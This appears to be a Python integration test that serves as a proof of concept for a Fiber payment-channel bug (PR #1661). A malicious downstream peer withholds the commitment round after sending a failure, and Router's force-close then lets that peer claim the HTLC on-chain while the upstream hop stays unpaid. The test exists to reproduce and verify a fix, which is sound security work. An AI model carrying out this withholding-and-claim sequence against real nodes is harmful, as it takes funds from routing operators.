"""PR #1661 PoC: an uncommitted failure hides an on-chain fulfillment.

Topology::

    Alice (payer) -> Router (victim) -> Bob (malicious downstream peer)

The downstream TLC is first fully committed. Bob then cancels a hold invoice,
which produces a protocol-valid encrypted ``RemoveTlcFail``, but holds the
following CommitmentSigned/RevokeAndAck round. Router therefore records the
failure as ``RemoteRemoved`` without committing it. Router force-closes while
its last signed commitment still contains the TLC, and Bob claims that TLC
on-chain with the exact preimage.

The vulnerable PR #1661 behavior is that Router keeps the downstream TLC's
failure state and does not relay the exact on-chain fulfill upstream: Alice
stays Inflight and the upstream TLC stays Committed. A complete fix makes this
PoC fail by moving Alice to Success and removing the upstream TLC with the
preimage.
"""

from __future__ import annotations

import hashlib
import time

from framework.basic_p2p import P2pFiberTest
from framework.helper.settlement_witness import SettlementWitness
from framework.p2p_peer import P2pPeer
from framework.test_fiber import FiberConfigPath

CKB = 100000000
PAYMENT_AMOUNT = 1 * CKB
CHANNEL_FUND = 200 * CKB
FINAL_EXPIRY_DELTA = 24 * 60 * 60 * 1000
REMOVED_UNCONFIRMED = ("RemoteRemoved", "RemoveWaitPrevAck", "RemoveWaitAck")
ISOLATED_TMP = "tmp/pr1661_uncommitted_fail"


def sha256_hex(preimage_hex):
    raw = bytes.fromhex(preimage_hex.removeprefix("0x"))
    return "0x" + hashlib.sha256(raw).hexdigest()


def hex_int(value):
    if value is None:
        return None
    return int(value, 16) if isinstance(value, str) else int(value)


class TestPR1661UncommittedFailHidesOnchainFulfill(P2pFiberTest):
    """Exercise the live three-node version of FIBER-PR1661-ONCHAIN-001."""

    auto_open_channel = False
    tmp_path_name = ISOLATED_TMP
    start_fiber_config = {"fiber_watchtower_check_interval_seconds": 5}

    def _open_topology(self):
        self.alice = self.fiber1
        self.router = self.start_new_fiber(
            self.generate_account(10000),
            fiber_version=FiberConfigPath.CURRENT_DEV,
        )
        self.bob = self.attacker
        self.peer = P2pPeer(self.bob)

        self.bob.connect_peer(self.router)
        time.sleep(1)
        self.ch_alice = self.open_channel(
            self.alice, self.router, CHANNEL_FUND, CHANNEL_FUND
        )
        self.ch_bob = self.open_channel(
            self.router, self.bob, CHANNEL_FUND, CHANNEL_FUND
        )
        time.sleep(3)
        self.wait_graph_channels_sync(self.alice, 2, timeout=90)
        self.wait_graph_channels_sync(self.router, 2, timeout=90)

    def _channel(self, fiber, channel_id):
        channels = fiber.get_client().list_channels({"include_closed": True})[
            "channels"
        ]
        for channel in channels:
            if channel["channel_id"] == channel_id:
                return channel
        raise AssertionError(f"channel {channel_id} not found on {fiber.tmp_path}")

    def _tlc(self, fiber, channel_id, payment_hash):
        channel = self._channel(fiber, channel_id)
        for tlc in channel.get("pending_tlcs") or []:
            if tlc.get("payment_hash") == payment_hash:
                return tlc
        return None

    def _wait_tlc(self, fiber, channel_id, payment_hash, expected, timeout=90):
        last = None
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            last = self._tlc(fiber, channel_id, payment_hash)
            if last is not None and last.get("status") == expected:
                return last
            time.sleep(0.5)
        raise TimeoutError(
            f"{fiber.tmp_path} {channel_id} TLC {payment_hash} "
            f"status {last} != {expected}"
        )

    def _wait_downstream_failure(self, payment_hash, timeout=90):
        last = None
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            last = self._tlc(self.router, self.ch_bob, payment_hash)
            if last is not None:
                status = (last.get("status") or {}).get("Outbound")
                if status in REMOVED_UNCONFIRMED:
                    return last
            time.sleep(0.25)
        raise TimeoutError(
            f"Router did not record the uncommitted downstream failure: {last}"
        )

    def _mine_watchtower_round(self):
        pool = self.node.getClient().get_raw_tx_pool()
        pending = list(pool.get("pending") or [])
        if pending:
            self.Miner.miner_until_tx_committed(self.node, pending[0])
        else:
            self.Miner.miner_with_version(self.node, "0x0")
        time.sleep(1)

    def _wait_for_commitment_spend(self, close_tx, timeout=180):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            spending_tx, _ = self.get_ln_cell_death_hash(close_tx)
            if spending_tx is not None:
                result = self.node.getClient().get_transaction(spending_tx)
                if result["tx_status"]["status"] == "committed":
                    return result["transaction"]
            self._mine_watchtower_round()
        raise TimeoutError(f"commitment output {close_tx}:0 was not spent")

    def _assert_exact_preimage_claim(
        self, close_tx, settlement_tx, payment_hash, preimage
    ):
        close = self.node.getClient().get_transaction(close_tx)["transaction"]
        lock_args = bytes.fromhex(close["outputs"][0]["lock"]["args"][2:])
        if len(lock_args) == 58 and lock_args[-1] == 1:
            version = "v1"
        else:
            assert len(lock_args) == 57, close
            version = "legacy"

        commitment_input = next(
            index
            for index, item in enumerate(settlement_tx["inputs"])
            if item["previous_output"] == {"tx_hash": close_tx, "index": "0x0"}
        )
        witness = SettlementWitness.from_hex(
            settlement_tx["witnesses"][commitment_input], version=version
        )
        witness.assert_single_tlc_claim([(payment_hash, PAYMENT_AMOUNT)], preimage)
        return version

    def _wait_downstream_closed(self, timeout=90):
        deadline = time.monotonic() + timeout
        last = None
        while time.monotonic() < deadline:
            last = self._channel(self.router, self.ch_bob)
            if last["state"]["state_name"] == "Closed":
                return last
            self._mine_watchtower_round()
        raise TimeoutError(f"downstream channel did not close: {last}")

    def test_uncommitted_fail_filters_exact_onchain_fulfill(self):
        self._open_topology()
        alice_balance_before = self._channel(self.alice, self.ch_alice)
        router_balance_before = self._channel(self.router, self.ch_alice)

        preimage = self.generate_random_preimage()
        payment_hash = sha256_hex(preimage)
        invoice = self.bob.get_client().new_invoice(
            {
                "amount": hex(PAYMENT_AMOUNT),
                "currency": "Fibd",
                "description": "PR1661 uncommitted fail then on-chain fulfill",
                "payment_hash": payment_hash,
                "hash_algorithm": "sha256",
                "final_expiry_delta": hex(FINAL_EXPIRY_DELTA),
            }
        )

        payment = self.alice.get_client().send_payment(
            {
                "invoice": invoice["invoice_address"],
                "max_fee_rate": hex(1000000000000000),
            }
        )
        assert payment["payment_hash"] == payment_hash
        self.wait_payment_state(self.alice, payment_hash, "Inflight", timeout=90)
        self.wait_invoice_state(self.bob, payment_hash, "Received", timeout=90)

        router_out = self._wait_tlc(
            self.router,
            self.ch_bob,
            payment_hash,
            {"Outbound": "Committed"},
        )
        self._wait_tlc(
            self.bob,
            self.ch_bob,
            payment_hash,
            {"Inbound": "Committed"},
        )
        self._wait_tlc(
            self.router,
            self.ch_alice,
            payment_hash,
            {"Inbound": "Committed"},
        )
        self._wait_tlc(
            self.alice,
            self.ch_alice,
            payment_hash,
            {"Outbound": "Committed"},
        )
        upstream_amount = hex_int(
            self._tlc(self.alice, self.ch_alice, payment_hash)["amount"]
        )
        assert upstream_amount >= PAYMENT_AMOUNT, upstream_amount
        # Let the valid encrypted RemoveTlcFail reach Router, but stop the
        # commitment round that would apply it and relay it to Alice.
        self.peer.intercept(
            self.ch_bob,
            hold_out=["CommitmentSigned", "RevokeAndAck"],
        )
        cancelled = self.bob.get_client().cancel_invoice({"payment_hash": payment_hash})
        assert cancelled["status"] == "Cancelled", cancelled
        failed_out = self._wait_downstream_failure(payment_hash)
        assert (failed_out["status"] or {}).get("Outbound") in REMOVED_UNCONFIRMED

        alice_before_close = self.alice.get_client().get_payment(
            {"payment_hash": payment_hash}
        )
        assert alice_before_close["status"] == "Inflight", alice_before_close
        upstream_before_close = self._tlc(self.router, self.ch_alice, payment_hash)
        assert upstream_before_close["status"] == {
            "Inbound": "Committed"
        }, upstream_before_close

        # The watchtower receives P independently of the cancelled invoice.
        # Router's latest signed commitment still contains the TLC because the
        # failure was never commitment-signed. Force-closing that snapshot lets
        # Bob claim it with P even though Bob just reported a failure off-chain.
        self.bob.get_client().call(
            "create_preimage",
            [{"payment_hash": payment_hash, "preimage": preimage}],
        )
        self.router.get_client().shutdown_channel(
            {"channel_id": self.ch_bob, "force": True}
        )
        close_tx = self.wait_and_check_tx_pool_fee(1000, False)
        self.Miner.miner_until_tx_committed(self.node, close_tx)
        self.node.getClient().generate_epochs("0x1", wait_time=0)

        settlement_tx = self._wait_for_commitment_spend(close_tx)
        version = self._assert_exact_preimage_claim(
            close_tx, settlement_tx, payment_hash, preimage
        )
        # The settlement transaction creates delayed outputs. Advance one
        # epoch so the watchtower can finish those outputs and emit
        # ChannelSettlementCompleted; empty blocks alone do not mature them.
        self.node.getClient().generate_epochs("0x1", wait_time=0)
        downstream = self._wait_downstream_closed()

        # Vulnerable result: even after the exact preimage claim, nothing
        # fulfills the still-live upstream hop.
        quiet_deadline = time.monotonic() + 15
        while time.monotonic() < quiet_deadline:
            self._mine_watchtower_round()
            current = self.alice.get_client().get_payment(
                {"payment_hash": payment_hash}
            )
            assert current["status"] == "Inflight", current

        alice_after = self.alice.get_client().get_payment(
            {"payment_hash": payment_hash}
        )
        alice_channel = self._channel(self.alice, self.ch_alice)
        router_channel = self._channel(self.router, self.ch_alice)
        downstream_tlc = self._tlc(self.router, self.ch_bob, payment_hash)
        alice_upstream = self._tlc(self.alice, self.ch_alice, payment_hash)
        router_upstream = self._tlc(self.router, self.ch_alice, payment_hash)

        assert downstream["state"]["state_name"] == "Closed", downstream
        assert downstream_tlc is not None, downstream
        assert (downstream_tlc["status"] or {}).get(
            "Outbound"
        ) in REMOVED_UNCONFIRMED, downstream_tlc
        assert alice_after["status"] == "Inflight", alice_after
        assert alice_channel["state"]["state_name"] == "ChannelReady", alice_channel
        assert router_channel["state"]["state_name"] == "ChannelReady", router_channel
        assert alice_upstream["status"] == {"Outbound": "Committed"}, alice_upstream
        assert router_upstream["status"] == {"Inbound": "Committed"}, router_upstream

        expiry_ms = hex_int(router_out["expiry"])
        tip = self.node.getClient().get_tip_header()
        chain_time_ms = int(
            self.node.getClient().get_block_median_time(tip["hash"]), 16
        )
        assert chain_time_ms < expiry_ms, (chain_time_ms, expiry_ms)

        print(
            "PR1661 PoC reproduced",
            {
                "payment_hash": payment_hash,
                "commitment_tx": close_tx,
                "settlement_tx": settlement_tx["hash"],
                "commitment_version": version,
                "downstream_state": downstream["state"],
                "downstream_tlc": downstream_tlc["status"],
                "alice_payment": alice_after["status"],
                "upstream_alice_tlc": alice_upstream["status"],
                "upstream_router_tlc": router_upstream["status"],
            },
        )
        self.wait_payment_state(self.alice, payment_hash, "Success", timeout=360)
        payment_after = self.alice.get_client().get_payment(
            {"payment_hash": payment_hash}
        )
        assert payment_after.get("payment_preimage") == preimage, payment_after

        # The upstream channel must debit Alice and credit Router by the
        # committed TLC amount (invoice amount plus routing fee). Check both
        # channel views, not just the payer's Success status.
        expected_alice_local = (
            hex_int(alice_balance_before["local_balance"]) - upstream_amount
        )
        expected_router_local = (
            hex_int(router_balance_before["local_balance"]) + upstream_amount
        )
        expected_alice_remote = (
            hex_int(alice_balance_before["remote_balance"]) + upstream_amount
        )
        expected_router_remote = (
            hex_int(router_balance_before["remote_balance"]) - upstream_amount
        )
        alice_balance_after = self._channel(self.alice, self.ch_alice)
        router_balance_after = self._channel(self.router, self.ch_alice)
        assert hex_int(alice_balance_after["local_balance"]) == expected_alice_local, (
            alice_balance_before,
            alice_balance_after,
        )
        assert (
            hex_int(alice_balance_after["remote_balance"]) == expected_alice_remote
        ), (
            alice_balance_before,
            alice_balance_after,
        )
        assert (
            hex_int(router_balance_after["local_balance"]) == expected_router_local
        ), (
            router_balance_before,
            router_balance_after,
        )
        assert (
            hex_int(router_balance_after["remote_balance"]) == expected_router_remote
        ), (
            router_balance_before,
            router_balance_after,
        )
